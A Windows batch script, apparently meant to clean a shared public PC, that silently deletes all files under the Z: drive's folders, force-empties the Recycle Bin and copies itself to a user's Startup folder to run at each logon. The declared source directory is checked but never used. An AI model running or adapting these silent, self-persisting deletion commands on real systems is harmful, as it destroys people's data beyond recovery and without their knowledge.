@echo off
REM This batch file will silently empty all folders in the Z drive from the specified location and empty the Recycle Bin.
REM Additionally, it will copy itself to the startup folder to run on system startup.

REM Set the source directory (C:\Users\<username>\temp)
set "source_dir=C:\users\%username%\temp"

REM Define the startup folder path
set "startup_folder=C:\Users\Netloan_User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

REM Define the current script file name
set "script_name=%~nx0"

REM Copy this script to the startup folder
if not exist "%startup_folder%\%script_name%" (
    copy "%~f0" "%startup_folder%\%script_name%" >nul 2>&1
)

REM Suppress command echoing and redirect all output to nul to ensure silence
@echo off >nul 2>&1

REM Check if Z drive exists
if not exist Z:\ exit /b

REM Ensure the source directory exists
if not exist "%source_dir%" exit /b

REM Iterate through all subdirectories in Z:\ and delete files
for /d %%d in (Z:\*) do (
    del /q /s "%%d\*" >nul 2>&1
)

REM Empty the Recycle Bin
powerShell -Command "Clear-RecycleBin -Force" >nul 2>&1

REM Exit silently
exit /b
